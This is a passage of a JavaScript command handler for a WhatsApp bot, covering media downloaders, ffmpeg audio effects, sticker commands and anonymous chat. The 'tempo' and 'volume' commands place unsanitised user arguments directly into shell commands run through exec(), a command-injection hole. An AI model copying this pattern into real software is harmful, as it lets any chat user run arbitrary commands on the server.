		let { wikimedia } = require('./lib/scraper')
                anu = await wikimedia(q)
                let result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `${prefix}wikimedia ${q}`, buttonText: {displayText: '➡️Next Image➡️'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image },
                    caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`,
                    footer: SkyzeeBOT.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                if (notButtons || from.includes("@s.whatsapp.net")) delete buttonMessage.buttons
                SkyzeeBOT.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'quotesanime': case 'animequotes': case 'animequote': case 'quoteanime': {
		let { quotesAnime } = require('./lib/scraper')
                let anu = await quotesAnime()
                let result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `${prefix}quotesanime`, buttonText: {displayText: '➡️Next➡️'}, type: 1}
                ]
                let buttonMessage = {
                    text: `~_${result.quotes}_\n\nBy '${result.karakter}', ${result.anime}\n\n- ${result.up_at}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                if (notButtons || from.includes("@s.whatsapp.net")) delete buttonMessage.buttons
                SkyzeeBOT.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'zodiak': case 'zodiac': {
                if (!text) return reply(`Example : ${prefix+ command} 7 7 2005`)
                let zodiak = [
                    ["capricorn", new Date(1970, 0, 1)],
                    ["aquarius", new Date(1970, 0, 20)],
                    ["pisces", new Date(1970, 1, 19)],
                    ["aries", new Date(1970, 2, 21)],
                    ["taurus", new Date(1970, 3, 21)],
                    ["gemini", new Date(1970, 4, 21)],
                    ["cancer", new Date(1970, 5, 22)],
                    ["leo", new Date(1970, 6, 23)],
                    ["virgo", new Date(1970, 7, 23)],
                    ["libra", new Date(1970, 8, 23)],
                    ["scorpio", new Date(1970, 9, 23)],
                    ["sagittarius", new Date(1970, 10, 22)],
                    ["capricorn", new Date(1970, 11, 22)]
                ].reverse()

                function getZodiac(month, day) {
                    let d = new Date(1970, month - 1, day)
                    return zodiak.find(([_,_d]) => d >= _d)[0]
                }
                let date = new Date(text)
                if (date == 'Invalid Date') throw date
                let d = new Date()
                let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
                let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

                let zodiac = await getZodiac(birth[1], birth[2])
                
                let anu = await primbon.zodiak(zodiac)
                if (anu.status == false) return reply(anu.message)
                SkyzeeBOT.sendText(m.chat, `${themeemoji} *Zodiac :* ${anu.message.zodiak}\n${themeemoji} *Number :* ${anu.message.nomor_keberuntungan}\n${themeemoji} *Aroma :* ${anu.message.aroma_keberuntungan}\n${themeemoji} *Planet :* ${anu.message.planet_yang_mengitari}\n${themeemoji} *Flower :* ${anu.message.bunga_keberuntungan}\n${themeemoji} *Color :* ${anu.message.warna_keberuntungan}\n${themeemoji} *Stone :* ${anu.message.batu_keberuntungan}\n${themeemoji} *Element :* ${anu.message.elemen_keberuntungan}\n${themeemoji} *Zodiac Couple :* ${anu.message.pasangan_zodiak}\n${themeemoji} *Notes :* ${anu.message.catatan}`, m)
            }
            break
            case 'shio': {
                if (!text) return reply(`Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`)
                let anu = await primbon.shio(text)
                if (anu.status == false) return reply(anu.message)
                SkyzeeBOT.sendText(m.chat, `${themeemoji} *Results :* ${anu.message}`, m)
            }
            break
	    case 'tiktok':{
  if (!q) return reply('Where is the link?')
  reply(mess.wait)
  if (!q.includes('tiktok')) return reply(`That's not a tiktok link!`)
   const musim_rambutan = await SkyzeeBOTTiktok(`${q}`).catch(e => {
 reply(mess.error) 
} )
   console.log(musim_rambutan)
   const xeontiktokop = musim_rambutan.result.watermark
texttk = `Wanna download no watermark or audio?`
let buttons = [
{buttonId: `${prefix}ttnowm ${q}`, buttonText: {displayText: 'No Watermark ❌'}, type: 1},
{buttonId: `${prefix}ttaud ${q}`, buttonText: {displayText: 'Audio 🎶'}, type: 1}
]
let buttonMessage = {
video: {url:xeontiktokop},
caption: texttk,
footer: `${botname}`,
buttons: buttons,
headerType: 4,
contextInfo:{externalAdReply:{
title: `${ownername}`,
body: `${pushname}`,
thumbnail: log0,
mediaType:1,
mediaUrl: q,
sourceUrl: q
}}
}
if (notButtons || from.includes("@s.whatsapp.net")) {
    texttk += `\n\n${buttons[0].buttonId} to Video No Watermark\n${buttons[1].buttonId} to Audio`
    delete buttonMessage.buttons
}
SkyzeeBOT.sendMessage(from, buttonMessage, {quoted:m})
}
break
  case 'tiktoknowm': case 'ttnowm':{
  if (!q) return reply('Where is the link?')
  reply(mess.wait)
  if (!q.includes('tiktok')) return reply(`That's not a tiktok link!`)
   const musim_rambutan = await SkyzeeBOTTiktok(`${q}`).catch(e => {
 reply(mess.error) 
} )
   console.log(musim_rambutan)
   const xeonytiktoknowm = musim_rambutan.result.nowatermark
    SkyzeeBOT.sendMessage(from, { video: { url: xeonytiktoknowm }, caption: "Here you go!" }, { quoted: m })
   }
  break
  case 'tiktokaudio':
case 'tiktokmusic':
case 'ttaud':{
  if (!q) return reply('Where is the audio?')
  if (!q.includes('tiktok')) return reply(`That's not a tiktok link!`)
   const musim_rambutan = await SkyzeeBOTTiktok(`${q}`).catch(e => {
 reply(mess.error) 
} )
   console.log(musim_rambutan)
   const xeonytiktokaudio = musim_rambutan.result.nowatermark
    SkyzeeBOT.sendMessage(from, { audio: { url: xeonytiktokaudio }, mimetype: 'audio/mp4' }, { quoted: m })
   }
 break
    case 'play': case 'ytplay':{
                if (!text) throw `Example : ${prefix + command} anime whatsapp status`
                let yts = require("youtube-yts")
                let search = await yts(text)
                let anulay = search.videos[Math.floor(Math.random() * search.videos.length)]
                let buttons = [
                    {buttonId: `#playmp3 ${anulay.url}`, buttonText: {displayText: '♫ Audio'}, type: 1},
                    {buttonId: `#playmp4 ${anulay.url}`, buttonText: {displayText: '► Video'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: anulay.thumbnail },
                    caption: `
${themeemoji} Title : ${anulay.title}
${themeemoji} Ext : Search
${themeemoji} ID : ${anulay.videoId}
${themeemoji} Duration : ${anulay.timestamp}
${themeemoji} Viewers : ${anulay.views}
${themeemoji} Upload At : ${anulay.ago}
${themeemoji} Author : ${anulay.author.name}
${themeemoji} Channel : ${anulay.author.url}
${themeemoji} Description : ${anulay.description}
${themeemoji} Url : ${anulay.url}`,
                    footer: botname,
                    buttons: buttons,
                    headerType: 4
                }
                SkyzeeBOT.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case 'getmusic': case 'getvideo': case 'yt': case 'youtube': case 'ytvideo': case 'ytmp3': case 'ytmp4': case 'ytmusic': {
if (!args[0]) return reply(mess.linkm)
try {
hx.youtube(args[0]).then(async(res) => {
textyt = `*| YOUTUBE DOWNLOADER |*

${global.themeemoji} Title : ${res.title}
${global.themeemoji} Size : ${res.size}
${global.themeemoji} Quality : ${res.quality}

_Select video or audio and wait a while_`
let buttons = [
{buttonId: `${prefix}ytvd ${res.link}`, buttonText: {displayText: '► Video'}, type: 1},
{buttonId: `${prefix}ytad ${res.mp3}`, buttonText: {displayText: '♫ Audio'}, type: 1}
]
let buttonMessage = {
image: {url:res.thumbnail},
caption: textyt,
footer: `${botname}`,
buttons: buttons,
headerType: 4,
contextInfo:{externalAdReply:{
title: res.title,
body: `${global.ownername}`,
thumbnail: {url:res.thumbnail},
mediaType:2,
mediaUrl: args[0],
sourceUrl: args[0]
}}
}
if (notButtons || from.includes("@s.whatsapp.net")) {
    textyt += `\n\n${buttons[0].buttonId} to Video\n${buttons[1].buttonId} to Audio`
    delete buttonMessage.buttons
}
SkyzeeBOT.sendMessage(from, buttonMessage, {quoted:m})
}).catch(_ => _)
} catch {
reply("Link error!")
}
}
break
case 'ytvd': {
    youtubedlv2(args[0]).then(async(res) => {
        SkyzeeBOT.sendMessage(from, {video:{url:res.video}, mimetype:"video/mp4", caption:"Success", contextInfo:{externalAdReply:{
title:`${global.botname}`,
body:`${global.botname}`,
thumbnail: log0,
mediaType:2,
mediaUrl: `${global.websitex}`,
sourceUrl: `${global.websitex}`
}}}, {quoted:m})
    })
}
break
case 'ytad': {
SkyzeeBOT.sendMessage(from, {audio:{url:args[0]}, mimetype:"audio/mp4", ptt:true, contextInfo:{externalAdReply:{
title:`${global.botname}`,
body:`${global.botname}`,
thumbnail: log0,
mediaType:2,
mediaUrl: `${global.websitex}`,
sourceUrl: `${global.websitex}`
}}}, {quoted:m})
}
break
            case 'ytdl': {
                if (!args[0]) return reply(mess.linkm)
                if (!isUrl(args[0]) && !args[0].includes('youtube.com')) return reply(`The link you provided is invalid`)
                anu = await fetchJson(`https://api.akuari.my.id/downloader/youtube?link=${args[0]}`)        
                if (anu.filesize_video >= 999999) return reply('*File Over Limit* '+util.format(anu))
                tummb = await getBuffer(anu.thumb)
                audio = await getBuffer(anu.audio)        
                SkyzeeBOT.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `${anu.title}`}, { quoted : m }).catch((err) => reply(mess.error))
                SkyzeeBOT.sendMessage(m.chat, { video: { url: anu.video }, jpegThumbnail:tummb, caption: `${util.format(anu)}`}, { quoted: m }).catch((err) => reply(mess.error))
            }
            break
case 'ytshorts': case 'shorts': {
  if (!args[0]) return reply(`*Use ${prefix + command} put yt shorts link*`)
  if (!isUrl(args[0]) && !args[0].includes('youtube')) return reply(`The link you provided is not valid`)
  xeonkey.Youtube(`${args[0]}`).then(async (data) => {
  if (data.medias[0].formattedSize.split('MB')[0] >= 999) return reply('*File Over Limit* '+util.format(data)) 
  cap = `
*YOUTUBE SHORTS*

*${themeemoji}TITLE:* ${data.title}\n*${themeemoji}QUALITY:* ${data.medias[0].quality}\n*${themeemoji}SIZE:* ${data.medias[0].formattedSize}\n*${themeemoji}DURATION* ${data.duration}\n*${themeemoji}ID:* ${data.medias[0].cached}\n*${themeemoji}LINK:* ${data.url}\n\n*${botname}*`
  buf = await getBuffer(data.thumbnail)
  SkyzeeBOT.sendMessage(m.chat, { image: { url: data.thumbnail }, jpegThumbnail:buf, caption: `${cap}` }, { quoted: m })
  SkyzeeBOT.sendMessage(m.chat, { video: { url: data.medias[0].url }, jpegThumbnail:buf, caption: `*${themeemoji}TITLE:* ${data.title}\n*${themeemoji}QUALITY:* ${data.medias[0].quality}\n*${themeemoji}SIZE:* ${data.medias[0].formattedSize}` }, { quoted: m })  
                }).catch((err) => {
                    reply(mess.reply)
                })
            }
            break
	  case 'pinterest': case 'pin': {
if (!args.join(" ")) return reply("What picture are you looking for?")
try {
hx.pinterest(args.join(" ")).then(async(res) => {
imgnyee = res[Math.floor(Math.random() * res.length)]
let buttons = [
{buttonId: `${prefix}pinterest ${args.join(" ")}`, buttonText: {displayText: 'Next Image 👀'}, type: 1}
]
let buttonMessage = {
image: { url: imgnyee },
caption:  `${global.dogeemoji} Title : ` + args.join(" ") + `\n${global.dogeemoji} Media Url : `+imgnyee,
footer: `${global.botname}`,
buttons: buttons,
headerType: 4,
contextInfo:{externalAdReply:{
title:`${global.botname}`,
body:`${global.ownername}`,
thumbnail: log0,
mediaType:2,
mediaUrl: `${global.websitex}`,
sourceUrl: `${global.websitex}`
}}
}
if (notButtons || from.includes("@s.whatsapp.net")) delete buttonMessage.buttons
SkyzeeBOT.sendMessage(m.chat, buttonMessage, { quoted: m })
}).catch((err) => {reply(mess.reply)})
} catch {
reply("Error")
}
}
break
case 'mediafire': {
if (!text) return reply(mess.linkm)
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return reply(`The link you provided is invalid`)
const baby1 = await mediafireDl(text)
if (baby1[0].size.split('MB')[0] >= 999) return reply('*File Over Limit* '+util.format(baby1))
const result4 = `*MEDIAFIRE DOWNLOADER*
				
*Name* : ${baby1[0].nama}
*Size* : ${baby1[0].size}
*Mime* : ${baby1[0].mime}
*Link* : ${baby1[0].link}`
reply(`${result4}`)
SkyzeeBOT.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m }).catch ((err) => reply(mess.error))
}
break
            case 'umma': case 'ummadl': {
	        if (!q) return reply(`Example : ${prefix + command} https://umma.id/channel/video/post/gus-arafat-sumber-kecewa-84464612933698`)
                let { umma } = require('./lib/scraper')
		let anu = await umma(isUrl(q)[0])
		if (anu.type == 'video') {
		    let buttons = [
                        {buttonId: `${prefix}ytmp3 ${anu.media[0]} 128kbps`, buttonText: {displayText: '🎵Audio🎵'}, type: 1},
                        {buttonId: `${prefix}ytmp4 ${anu.media[0]} 360p`, buttonText: {displayText: '📽️Video📽️'}, type: 1}
                    ]
		    let buttonMessage = {
		        image: { url: anu.author.profilePic },
			caption: `
${themeemoji} Title : ${anu.title}
${themeemoji} Author : ${anu.author.name}
${themeemoji} Like : ${anu.like}
${themeemoji} Caption : ${anu.caption}
${themeemoji} Url : ${anu.media[0]}
To Download Media, Please Click One Of The Buttons Below Or Enter The ytmp3/ytmp4 Command With The Url Above
`,
			footer: SkyzeeBOT.user.name,
			buttons: buttons,
			headerType: 4
		    }
            if (notButtons || from.includes("@s.whatsapp.net")) delete buttonMessage.buttons
		    SkyzeeBOT.sendMessage(m.chat, buttonMessage, { quoted: m })
		} else if (anu.type == 'image') {
		    anu.media.map(async (url) => {
		        SkyzeeBOT.sendMessage(m.chat, { image: { url }, caption: `${themeemoji} Title : ${anu.title}\n${themeemoji} Author : ${anu.author.name}\n${themeemoji} Like : ${anu.like}\n${themeemoji} Caption : ${anu.caption}` }, { quoted: m })
		    })
		}
	    }
	    break
        case 'ringtone': {
		if (!text) return reply(`Where is the ringtone name noob?, Example : ${prefix + command} charlie puth`)
        let { ringtone } = require('./lib/scraper')
		let anu = await ringtone(text)
		let result = anu[Math.floor(Math.random() * anu.length)]
		SkyzeeBOT.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
case 'tempo': {
if (!args.join(" ")) return reply(`Example: ${prefix + command} 10`)
var req = args.join(' ')
media = await SkyzeeBOT.downloadAndSaveMediaMessage(quoted, "tempo")
if (isQuotedAudio) {
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=${req}" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
SkyzeeBOT.sendMessage(from, {audio:hah, mimetype:'audio/mp4', ptt:true}, {quoted:m})
fs.unlinkSync(ran)
})
} else if (isQuotedVideo) {
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=${req}" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
SkyzeeBOT.sendMessage(from, {video:hah, mimetype:'video/mp4'}, {quoted:m})
fs.unlinkSync(ran)
})
} else {
reply("Send video/audio")
}
}
break
case 'volume': {
if (!args.join(" ")) return reply(`Example: ${prefix + command} 10`)
media = await SkyzeeBOT.downloadAndSaveMediaMessage(quoted, "volume")
if (isQuotedAudio) {
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
jadie = fs.readFileSync(rname)
SkyzeeBOT.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
} else if (isQuotedVideo) {
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
jadie = fs.readFileSync(rname)
SkyzeeBOT.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
} else {
reply("Send video/audio")
}
}
break
		   case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                reply(mess.wait)
                let media = await SkyzeeBOT.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return reply(err)
                let buff = fs.readFileSync(ran)
                SkyzeeBOT.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else reply(`Reply To The Audio You Want To Change With Caption *${prefix + command}*`)
                } catch (e) {
                reply(e)
                }
                break
            case 'setcmd': {
            if (!m.isGroup) return replywarn(mess.group)
                if (!m.quoted) return reply(`Reply Message!`)
                if (!m.quoted.fileSha256) return reply(`SHA256 Hash Missing`)
                if (!q) return reply(`For What Command?`)
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return reply(`You Have No Permission To Change This Sticker Command`)
                global.db.data.sticker[hash] = {
                    q,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                reply(`Done!`)
            }
            break
            case 'delcmd': {
            if (!m.isGroup) return replywarn(mess.group)
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) return reply(`No Hashes`)
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return reply(`You Have No Permission To Delete This Sticker Command`)
                delete global.db.data.sticker[hash]
                reply(`Done!`)
            }
            break
            case 'listcmd': {
            if (!m.isGroup) return replywarn(mess.group)
                let teks = `
*Hash List*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                SkyzeeBOT.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break
            case 'lockcmd': {
                if (!isCreator) return replay(`${mess.owner}`)
                if (!m.quoted) return reply(`Reply Message!`)
                if (!m.quoted.fileSha256) return reply(`SHA256 Hash Missing`)
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) return reply(`Hash Not Found In Database`)
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                reply('Done!')
            }
            break
            case 'addmsg': {
            if (!m.isGroup) return replywarn(mess.group)
                if (!m.quoted) return reply(`Reply Message You Want To Save In Database`)
                if (!q) return reply(`Example : ${prefix + command} File Name`)
                let msgs = global.db.data.database
                if (q.toLowerCase() in msgs) return reply(`'${q}' Has Been Registered In The Message List`)
                msgs[q.toLowerCase()] = quoted.fakeObj
reply(`Successfully Added Message In Message List As '${q}'
    
Access With ${prefix}getmsg ${q}

View List Of Messages With ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
            if (!m.isGroup) return replywarn(mess.group)
                if (!q) return reply(`Example : ${prefix + command} file name\n\nView Message List With ${prefix}listmsg`)
                let msgs = global.db.data.database
                if (!(q.toLowerCase() in msgs)) return reply(`'${q}' Not Listed In The Message List`)
                SkyzeeBOT.copyNForward(m.chat, msgs[q.toLowerCase()], true)
            }
            break
            case 'listmsg': {
            if (!m.isGroup) return replywarn(mess.group)
                let msgs = JSON.parse(fs.readFileSync('./database/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = '「 DATABASE LIST 」\n\n'
		for (let i of seplit) {
		    teks += `${themeemoji} *Name :* ${i.nama}\n${themeemoji} *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        reply(teks)
	    }
	    break
            case 'delmsg': case 'deletemsg': {
            if (!m.isGroup) return replywarn(mess.group)
	        let msgs = global.db.data.database
	        if (!(q.toLowerCase() in msgs)) return reply(`'${q}' Not Listed In The Message List`)
		delete msgs[q.toLowerCase()]
		reply(`Delete Successfully '${q}' From The Message list`)
            }
	    break

//------ ANONYMOUS SESSION ------//
	    case 'anonymous': {
            if (m.isGroup) return reply(mess.private)
			this.anonymous = this.anonymous ? this.anonymous : {}
			let buttons = [
                { quickReplyButton: { displayText: '＃ 𝐒𝐄𝐀𝐑𝐂𝐇', id: `${prefix}start` } },
                { quickReplyButton: { displayText: '＃ 𝐋𝐄𝐀𝐕𝐄', id: `${prefix}leave` } }
            ]
            msg = `*👥 ᴀɴᴏɴʏᴍᴏᴜs ᴄʜᴀᴛ 👥*\n\n\`\`\`❝${await SkyzeeBOT.getName(m.sender)}❞\n⌦ 𝚊𝚌𝚝𝚒𝚟𝚎 𝚝𝚒𝚖𝚎: \n⌦ 𝚜𝚝𝚊𝚝𝚞𝚜: \n\n𝙐𝙣 𝙢𝙤𝙙𝙤 𝙙𝙚 𝙘𝙤𝙢𝙪𝙣𝙞𝙘𝙖𝙘𝙞ó𝙣 𝙖𝙣ó𝙣𝙞𝙢𝙤 𝙖 𝙩𝙧𝙖𝙫é𝙨 𝙙𝙚𝙡 ${botname} 𝙚𝙨𝙩𝙖𝙗𝙡𝙚𝙘𝙞𝙚𝙣𝙙𝙤 𝙪𝙣𝙖 𝙘𝙤𝙣𝙚𝙭𝙞ó𝙣 𝙙𝙞𝙧𝙚𝙘𝙩𝙖 𝙘𝙤𝙣 𝙪𝙣 𝙪𝙨𝙪𝙖𝙧𝙞𝙤 𝙖𝙡𝙚𝙖𝙩𝙤𝙧𝙞𝙤.\`\`\``
            if (!notButtons) SkyzeeBOT.sendButtonText(m.chat, buttons, msg, global.botname, m)
            if (notButtons) SkyzeeBOT.sendText(m.chat, msg + `\n\n${buttons[0].buttonId} para buscar usuario\n${buttons[1].buttonId} para finalizar`, m, {footer: global.botname})
        } break

        case 'keluar': case 'leave': {
            if (m.isGroup) return reply(mess.private)
            this.anonymous = this.anonymous ? this.anonymous : {}
            let room = Object.values(this.anonymous).find(room => room.check(m.sender))
            if (!room) {
                let buttons = [
                    { quickReplyButton: { displayText: '＃ 𝐒𝐄𝐀𝐑𝐂𝐇', id: `${prefix}start` } }
                ]
                if (!notButtons) await SkyzeeBOT.sendButtonText(m.chat, buttons, `\`\`\`You Are Not In An Anonymous Session, Press The Button To Find A Partner \`\`\``)
                if (notButtons) await SkyzeeBOT.sendText(m.chat, `\`\`\`You Are Not In An Anonymous Session, Press The Button To Find A Partner \`\`\``)
                reply(false)
            }
            reply('Ok')
            let other = room.other(m.sender)
            if (other) await SkyzeeBOT.sendText(other, `\`\`\`Partner Has Left Anonymous Session\`\`\``, m)
            delete this.anonymous[room.id]
            if (command === 'leave') break
            }

        case 'mulai': case 'start': {
            if (m.isGroup) return reply(mess.private)
            this.anonymous = this.anonymous ? this.anonymous : {}
            if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
                let buttons = [
                    { quickReplyButton: { displayText: '＃ 𝐋𝐄𝐀𝐕𝐄', id: `${prefix}leave` } }
                ]
                if (!notButtons) await SkyzeeBOT.sendButtonText(m.chat, buttons, `\`\`\`You Are Still In An Anonymous Session, Press The Button Below To Terminate Your Anonymous Session\`\`\``, SkyzeeBOT.user.name, m)
                if (notButtons) await SkyzeeBOT.sendText(m.chat, `\`\`\`You Are Still In An Anonymous Session, Type ${buttons[0].buttonId} To Terminate Your Anonymous Session\`\`\``, m, {footer: SkyzeeBOT.user.name})
                reply(false)
            }
            let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
            if (room) {
                let buttons = [
                    { quickReplyButton: { displayText: '＃ 𝐒𝐊𝐈𝐏', id: `${prefix}next` } },
                    { quickReplyButton: { displayText: '＃ 𝐋𝐄𝐀𝐕𝐄', id: `${prefix}leave` } }
                ]
                if (!notButtons) await SkyzeeBOT.sendButtonText(room.a, buttons, `\`\`\`Successfully Found Partner, Now You Can Send Message\`\`\``, SkyzeeBOT.user.name, m)
                if (notButtons) await SkyzeeBOT.sendText(room.a, `\`\`\`Successfully Found Partner, Now You Can Send Message\`\`\`\n\n${buttons[0].buttonId} to Skip\n${buttons[1].buttonId} to Stop`, m, {footer: SkyzeeBOT.user.name})
                room.b = m.sender
                room.state = 'CHATTING'
                if (!notButtons) await SkyzeeBOT.sendButtonText(room.b, buttons, `\`\`\`Successfully Found Partner, Now You Can Send Message\`\`\``, SkyzeeBOT.user.name, m)
                if (notButtons) await SkyzeeBOT.sendText(room.b, `\`\`\`Successfully Found Partner, Now You Can Send Message\`\`\``, m, {footer: SkyzeeBOT.user.name})
            } else {
                let id = + new Date
                this.anonymous[id] = {
                    id,
                    a: m.sender,
                    b: '',
                    state: 'WAITING',
                    check: function (who = '') {
                        return [this.a, this.b].includes(who)
                    },
                    other: function (who = '') {
                        return who === this.a ? this.b : who === this.b ? this.a : ''
                    },
                }
                let buttons = [
                    { quickReplyButton: { displayText: '＃ 𝐋𝐄𝐀𝐕𝐄', id: `${prefix}leave` } }
                ]
                if (!notButtons) await SkyzeeBOT.sendButtonText(m.chat, buttons, `\`\`\`Please Wait, Looking For A Partner\`\`\``, SkyzeeBOT.user.name, m)
                if (notButtons) await SkyzeeBOT.sendText(m.chat, `\`\`\`Please Wait, Looking For A Partner\`\`\`\n\n${buttons[0].buttonId} to Stop`, m, {footer: SkyzeeBOT.user.name})
            }
        break }
        case 'next': case 'lanjut': {
                if (m.isGroup) return reply('Features Cannot Be Used For Groups!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!romeo) {
                    let buttons = [
                        { quickReplyButton: { displayText: '＃ 𝐒𝐄𝐀𝐑𝐂𝐇', id: `${prefix}start` } }
                    ]
                    if (!notButtons) await SkyzeeBOT.sendButtonText(m.chat, buttons, `\`\`\`You Are Not In An Anonymous Session, Press The Button To Find A Partner\`\`\``)
                    if (notButtons) await SkyzeeBOT.sendText(m.chat, `\`\`\`You Are Not In An Anonymous Session, Press The Button To Find A Partner\`\`\`\n\n${buttons[0].buttonId} to Start`)
                    reply(false)
                }
                let other = romeo.other(m.sender)
                if (other) await SkyzeeBOT.sendText(other, `\`\`\`Partner Has Left Anonymous Session\`\`\``, m)
                delete this.anonymous[romeo.id]
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { quickReplyButton: { displayText: '＃ 𝐒𝐊𝐈𝐏', id: `${prefix}next` } },
                        { quickReplyButton: { displayText: '＃ 𝐋𝐄𝐀𝐕𝐄', id: `${prefix}leave` } }
                    ]
                    if (!notButtons) await SkyzeeBOT.sendButtonText(room.a, buttons, `\`\`\`Successfully Found Partner, Now You Can Send Message\`\`\``, SkyzeeBOT.user.name, m)
                    if (notButtons) await SkyzeeBOT.sendText(room.a, `\`\`\`Successfully Found Partner, Now You Can Send Message\`\`\``, m, {footer: SkyzeeBOT.user.name})
                    room.b = m.sender
                    room.state = 'CHATTING'
                    if (!notButtons) await SkyzeeBOT.sendButtonText(room.b, buttons, `\`\`\`Successfully Found Partner, Now You Can Send Message\`\`\``, SkyzeeBOT.user.name, m)
                    if (notButtons) await SkyzeeBOT.sendText(room.b, `\`\`\`Successfully Found Partner, Now You Can Send Message\`\`\``, m, {footer: SkyzeeBOT.user.name})
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { quickReplyButton: { displayText: '＃ 𝐋𝐄𝐀𝐕𝐄', id: `${prefix}leave` } }
                    ]
                    if (!notButtons) await SkyzeeBOT.sendButtonText(m.chat, buttons, `\`\`\`Please Wait, Looking For A Partner\`\`\``, SkyzeeBOT.user.name, m)
                    if (notButtons) await SkyzeeBOT.sendText(m.chat, `\`\`\`Please Wait, Looking For A Partner\`\`\`\n\n${buttons[0].buttonId} to Stop`, m, {footer: SkyzeeBOT.user.name})
                }
                break
            }
//------ ANONYMOUS SESSION ------//

	case 'request': noQ('¿Cuál es tu propuesta?'); {
		teks = `*| REQUEST |*\n\nNumber : @${m.sender.split("@")[0]}\nRequest : ${args.join(" ")}`
		SkyzeeBOT.sendMessage(`${owner}@s.whatsapp.net`, { text: teks, mentions:[m.sender] }, { quoted: m })
